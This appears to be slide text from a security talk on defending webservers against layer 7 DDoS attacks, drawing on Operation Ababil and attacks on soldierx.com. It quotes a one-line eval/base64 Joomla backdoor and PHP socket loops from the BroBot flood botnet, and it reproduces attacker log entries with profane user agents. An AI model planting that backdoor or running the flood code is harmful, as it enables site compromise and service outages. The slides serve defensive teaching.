1 
Humor – Your Adversaries 
2 
This is how your adversaries envision their DDoS attacks on your webserver: 
Humor – Your Webserver 
3 
This is how your webserver will respond after implementing some of the 
defensive strategies that this talk will cover: 
Background 
•  Personal 
–  Blake currently works as a senior security architect.  
He was directly involved with defending against 
Operation Ababil and has worked to defend SX against 
various DDoS attacks. 
–  Cisc0ninja works in threat intelligence and has been a 
long time member of SX. 
–  We both did infosec in the USMC 
•  Disclaimer 
–  Opinions/ideas/solutions are from us and not 
representative or from our employers. 
–  Some humor images have explicit language in them. 
4 
What This Speech Will Cover 
•  Requirements (for our examples) 
•  Introduction 
–  Why this talk is relevant 
–  What this talk is 
–  What this talk is not 
•  Attack Landscape 
–  Attacks from Operation Ababil and SX 
•  Network Defense and Monitoring 
–  Tools and techniques to provide defense and monitoring on the 
network 
•  Web Defense and Detection 
–  Tools and techniques to provide defense and detection on the 
webserver 
•  Reacting to an Attack 
–  How to handle DDoS when your organization is under fire 
•  Story Time 
–  Stories of attacks against SX and the aftermath 
5 
Requirements 
•  What do you need for our examples? 
–  Linux/Unix 
–  Apache2 
–  Python and Perl 
–  Raspberry Pi 
•  16x2 LCD for RoboAmp 
–  Snort 
•  Inline if possible 
–  Network sniffer 
•  Hardware if possible 
–  Critical thinking skills 
•  We’re trying to teach you how to adapt your defenses as the 
attackers improve their offensive capabilities 
6 
•  Why this talk is relevant 
–  Layer 7 (Application) DDoS attacks have been on the rise since 
at least 2010.  Operation Ababil was low in technical complexity, 
but had a major impact on the financial sector. 
–  DDoS one of the preferred methods by hacktivists as a form of 
protest 
–  What about CloudFlare/Prolexic/etc 
•  Cost 
•  Security through obscurity (only as secure as your IP address) for non BGP 
based solutions 
– 
Web sites often leak IP addresses 
– 
Historical records 
– 
DNS bruteforcers (such as Knock) 
– 
PTR records 
•  Privacy concerns 
7 
Introduction - Relevance 
•  What this talk is 
–  A look at real world layer 7 DDoS attacks and defenses 
–  An instruction in how to approach DDoS defense as adversaries 
change their attacks 
–  A bit of humor at the expense of people who conduct DDoS 
attacks 
•  What this talk is not 
–  Silver bullet to solve all DDoS attacks 
–  A political stance on DDoS 
–  A cry for people to DDoS SX even more 
8 
Introduction – What this talk is 
•  Layer 7 DDoS 
–  Amplification attacks – biggest pipe wins 
–  HTTP DDoS – our focus 
•  Large amounts of GET/POST requests 
•  Downloading massive files (such as PDFs) 
•  Hitting expensive queries such as search functions 
–  Other application DDoS attacks – future fun 
•  Why? 
–  Lack of skill level necessary to do intrusions 
–  Political Protest 
–  Unwillingly participation? 
–  Or my favorite… 
9 
Attack Landscape 
•  John Gabriel’s (Penny Arcade) greater 
internet fuckwad theory: 
10 
Why (continued) 
Example Attacks (AQCF) 
• 
Operation Ababil 
– 
Large scale DDoS attack via php based botnet (BroBot) against American financial institutions 
– 
Wordpress/joomla/etc sites were backdoored with a simple code modification 
From:  
defined( '_JEXEC' ) or die( 'Restricted access' ); 
To: 
defined( '_JEXEC' ) or die(@eval(base64_decode($_REQUEST['c_id']))); 
– 
Backdoored sites then were called to do massive GET/POST attacks (large pdf, search 
functions, etc) 
Example 1: 
for($i=0;$i<4000;$i++){ 
    fwrite($socket, "POST / HTTP/1.0\r\nHost: ".$host."\r\nAccept: */*\r\nContent-Length: ".strlen($data)."\r\n\r\n".$data); 
 fclose($fp); 
} 
Example 2: 
for($i = 0;$i < $num;$i++){ 
 $fp = fsockopen("tls://".$parts['host'], 443); 
 stream_set_timeout($fp, 300); 
 fwrite($fp, http_req()); 
 stream_set_blocking($fp, 0); 
 $target_sockets[] = $fp; 
} 
function http_req(){ 
 $rand = md5(microtime().rand(0,500)); 
 $host = $parts['host']; 
 $path = $parts['path']; 
 return "POST $path HTTP/1.1\r\n” . "Host: $host\r\n” . "User-Agent: ".$ua[rand(0,count($ua)-1)]."\r\n” 
 . "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n” . "Accept-Language: en-us,en;q=0.5\r\n"   
 . "Accept-Encoding: gzip, deflate\r\n” . "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"  
 . "Connection: Keep-Alive\r\n” . "Cache-Control: no-cache\r\n” . "Referer: ".$referer."\r\n" 
 . "Cookie: ".getcookie()."\r\n” . "X-FORWARDED-FOR: ".ipgen()."\r\n” . "Via: ".ipgen()."\r\n" 
  ."CLIENT-IP: ".ipgen()."\r\n” . "Content-Type: application/x-www-form-urlencoded\r\n” 
 . "Content-Length: ” . strlen($postdata) . "\r\n\r\n” 
11 
Example Attacks (SX) 
• 
Attacks against soldierx.com 
– 
Mostly small scale DDoS attacks by individuals angry from forum comments, wanting HDB 
(hacker database) fame, or false HDB changes 
Examples: 
174.61.38.237 - - [24/Jul/2013:22:44:36 -0400] "GET /system/files/images/critical_dirtypanties01.preview.jpg HTTP/1.1" 403 30581 
"-" "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Nexus 7 Build/JDQ39)" 
174.61.38.237 - - [24/Jul/2013:22:44:38 -0400] "GET /system/files/images/critical_dirtypanties01.preview.jpg HTTP/1.1" 403 30580 
"-" "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Nexus 7 Build/JDQ39)” 
199.255.209.208 - - [02/Nov/2013:07:45:56 -0400] "GET /
UZMVEXPCUGYSFDXJUGIPKHBCNEPYNFZMUTEIRILNWACYKGKLLJWWIEAUHVENVHGKCTCJRAPFKGGWPMZRSESXH
SOEMRAUVELTNOI=RYPTYZNXFBPKCIUUKIULSBJISCKMVMFLNYAJOIPQODOPWXNMEBLVRLDMHSSHOBQTPQBDOWU
WEDOWGDAFFETPKWBMXHSGYLVWLTA HTTP/1.1" 302 8 
34 "-" "*" 
199.255.209.208 - - [02/Nov/2013:07:45:56 -0400] "GET /
VQQFETHNZLTJSHTKQULAMBELWBRTPAZVKXUECZTZRVCNKZFNMYXBXGDHPJJKWAFXNRCEMPFILVSNYSKGLZFTWG
VLPUQYVGCZNOV=TZVOFJYTDSHBJBZYZRGIRCOHSSLARSUBEBLJJZMOFAEUYJCHTAQHWPYDOTHXSRLEBMLJDHSZZ
LDWXMEKASYJPTQDQIXZUKVKHUZ HTTP/1.1" 302 834 "-" "*” 
209.73.151.188 - - [16/May/2013:07:12:47 -0400] "GET /?= HTTP/1.1” 403 1199 "http://www.google.com/?q=" "Fuck You 
motherfucker - TANGO DOWN (+http://twitter.com/VoXLulz1” 
209.73.151.188 - - [16/May/2013:07:12:47 -0400] "GET /?= HTTP/1.1” 403 1199 "http://www.usatoday.com/search/results?q=" 
"Fuck You motherfucker - TANGO DOWN (+http://twitter.com/VoXLulz1" 
209.73.151.188 - - [16/May/2013:07:12:47 -0400] "GET /?= HTTP/1.1” 403 1199 "http://engadget.search.aol.com/search?q=" 
"Fuck You motherfucker - TANGO DOWN (+http://twitter.com/VoXLulz1” 
209.73.151.188 - - [16/May/2013:07:12:47 -0400] "GET /?= HTTP/1.1” 403 1199 "http://www.soldierx.com/" "Fuck You 
motherfucker - TANGO DOWN (+http://twitter.com/VoXLulz1” 
91.121.19.26 - - [11/Mar/2013:02:40:26 -0400] "GET /node HTTP/1.0" 200 12062 "https://www.soldierx.com/" "Mozilla/5.0 
(Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0" 
91.121.19.26 - - [11/Mar/2013:02:45:41 -0400] "GET /node/ HTTP/1.0" 301 5257 "https://www.soldierx.com/" "Mozilla/4.0 
(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)" 
91.121.19.26 - - [11/Mar/2013:02:45:45 -0400] "GET /node HTTP/1.0" 200 12062 "https://www.soldierx.com/" "Mozilla/4.0 
(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)" 
91.121.19.26 - - [11/Mar/2013:02:46:29 -0400] "GET /node/ HTTP/1.0" 301 5257 "https://www.soldierx.com/" "Mozilla/4.0 
(compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]” 
12 
Example Attacks (DESU) 
• 
41.70.152.59 - - [13/Oct/2013:12:35:11 -0400] "A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 
Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. Desudesudesu~A cat is fine too. 